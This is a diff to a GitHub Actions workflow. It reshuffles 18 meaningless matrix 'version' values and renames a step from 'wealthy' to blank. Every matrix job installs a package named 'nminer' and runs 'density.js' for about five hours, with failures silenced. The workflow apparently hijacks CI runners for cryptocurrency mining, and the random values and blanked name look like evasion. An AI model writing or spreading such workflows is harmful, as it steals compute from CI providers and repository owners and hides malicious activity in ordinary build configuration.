@@ -9,24 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 280 }
-          - { version: 2405 }
-          - { version: 4910 }
-          - { version: 1756 }
-          - { version: 4813 }
-          - { version: 3944 }
-          - { version: 3108 }
-          - { version: 8617 }
-          - { version: 1999 }
-          - { version: 5807 }
-          - { version: 6019 }
-          - { version: 9529 }
-          - { version: 3655 }
-          - { version: 2702 }
-          - { version: 5918 }
-          - { version: 2022 }
-          - { version: 9688 }
-          - { version: 8822 }
+          - { version: 734 }
+          - { version: 6365 }
+          - { version: 3565 }
+          - { version: 8762 }
+          - { version: 2844 }
+          - { version: 7910 }
+          - { version: 9629 }
+          - { version: 1094 }
+          - { version: 9785 }
+          - { version: 5382 }
+          - { version: 7806 }
+          - { version: 2910 }
+          - { version: 7852 }
+          - { version: 2771 }
+          - { version: 4568 }
+          - { version: 4996 }
+          - { version: 8039 }
+          - { version: 9526 }
 
     steps:
       - name: Checkout
@@ -37,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: wealthy
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 330m node density.js || echo "density executed"
+          timeout 304m node density.js || echo "density executed"
